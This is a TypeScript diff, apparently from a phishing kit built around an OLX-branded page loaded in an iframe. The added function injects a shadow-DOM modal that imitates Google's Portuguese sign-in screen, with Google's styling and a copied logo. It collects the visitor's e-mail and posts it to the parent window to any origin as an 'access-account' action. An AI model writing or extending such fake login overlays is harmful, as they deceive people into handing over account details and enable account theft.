@@ -240,9 +240,117 @@ export function attachIframeInteractions(doc: Document): () => void {
     doc.removeEventListener("click", onClick, true);
     doc.removeEventListener("submit", onSubmit, true);
     doc.getElementById("__olx_help_modal_host__")?.remove();
+    doc.getElementById("__olx_google_modal_host__")?.remove();
     timers.forEach(clearTimeout);
     formTimers.forEach(clearTimeout);
   };
+}
+
+// =====================================================================
+// Modal "Entrar com Google" — pede e-mail e avança para próxima tela
+// =====================================================================
+function openGoogleEmailPrompt(doc: Document): void {
+  doc.getElementById("__olx_google_modal_host__")?.remove();
+
+  const host = doc.createElement("div");
+  host.id = "__olx_google_modal_host__";
+  (doc.body || doc.documentElement).appendChild(host);
+
+  const root = host.attachShadow({ mode: "open" });
+  root.innerHTML = `
+    <style>
+      :host { all: initial; }
+      .overlay {
+        position: fixed; inset: 0; z-index: 2147483647;
+        display: flex; align-items: center; justify-content: center;
+        padding: 16px; box-sizing: border-box;
+        background: rgba(0,0,0,.5);
+        font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      }
+      .sheet {
+        width: 100%; max-width: 400px; box-sizing: border-box;
+        border-radius: 12px; background: #fff; color: #1a1a1a;
+        padding: 24px; box-shadow: 0 8px 32px rgba(0,0,0,.2);
+      }
+      .brand { display:flex; align-items:center; gap:10px; margin-bottom: 16px; }
+      .brand img { width: 24px; height: 24px; }
+      .brand span { font-size: 14px; color: #5f6368; }
+      h2 { margin: 0 0 6px; font-size: 22px; font-weight: 500; color: #202124; }
+      p { margin: 0 0 20px; font-size: 14px; color: #5f6368; }
+      label { display:block; font-size: 12px; color: #5f6368; margin-bottom: 6px; }
+      input {
+        width: 100%; box-sizing: border-box; padding: 12px 14px;
+        border: 1px solid #dadce0; border-radius: 6px; font: inherit; font-size: 15px;
+        outline: none; color: #202124;
+      }
+      input:focus { border-color: #1a73e8; box-shadow: 0 0 0 1px #1a73e8; }
+      .err { color: #d93025; font-size: 12px; margin-top: 6px; min-height: 16px; }
+      .actions { display:flex; justify-content: space-between; align-items: center; margin-top: 20px; }
+      button {
+        font: inherit; font-weight: 500; font-size: 14px;
+        padding: 10px 18px; border-radius: 6px; cursor: pointer;
+        border: 0; background: transparent;
+      }
+      .cancel { color: #1a73e8; }
+      .next { background: #1a73e8; color: #fff; }
+      .next:hover { background: #1765cc; }
+    </style>
+    <div class="overlay">
+      <div class="sheet" role="dialog" aria-modal="true">
+        <div class="brand">
+          <img src="${window.location.origin}/google-logo.jpg" alt="Google" />
+          <span>Fazer login com a Conta do Google</span>
+        </div>
+        <h2>Fazer login</h2>
+        <p>Use sua Conta do Google</p>
+        <label for="g-email">E-mail ou telefone</label>
+        <input id="g-email" type="email" autocomplete="email" inputmode="email" />
+        <div class="err" id="g-err"></div>
+        <div class="actions">
+          <button type="button" class="cancel" data-act="cancel">Cancelar</button>
+          <button type="button" class="next" data-act="next">Próxima</button>
+        </div>
+      </div>
+    </div>
+  `;
+
+  const close = () => host.remove();
+  const overlay = root.querySelector<HTMLElement>(".overlay");
+  const sheet = root.querySelector<HTMLElement>(".sheet");
+  const input = root.querySelector<HTMLInputElement>("#g-email");
+  const err = root.querySelector<HTMLElement>("#g-err");
+  const cancel = root.querySelector<HTMLButtonElement>('[data-act="cancel"]');
+  const next = root.querySelector<HTMLButtonElement>('[data-act="next"]');
+
+  setTimeout(() => input?.focus(), 50);
+
+  overlay?.addEventListener("click", (e) => {
+    if (e.target === overlay) close();
+  });
+  sheet?.addEventListener("click", (e) => e.stopPropagation());
+  cancel?.addEventListener("click", close);
+
+  const submit = () => {
+    const v = (input?.value || "").trim();
+    const ok = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v);
+    if (!ok) {
+      if (err) err.textContent = "Insira um e-mail válido.";
+      input?.focus();
+      return;
+    }
+    close();
+    window.parent.postMessage(
+      { type: "iframe-help-action", action: "access-account", email: v },
+      "*",
+    );
+  };
+
+  next?.addEventListener("click", submit);
+  input?.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") { e.preventDefault(); submit(); }
+    else if (e.key === "Escape") close();
+    else if (err && err.textContent) err.textContent = "";
+  });
 }
 
 // =====================================================================
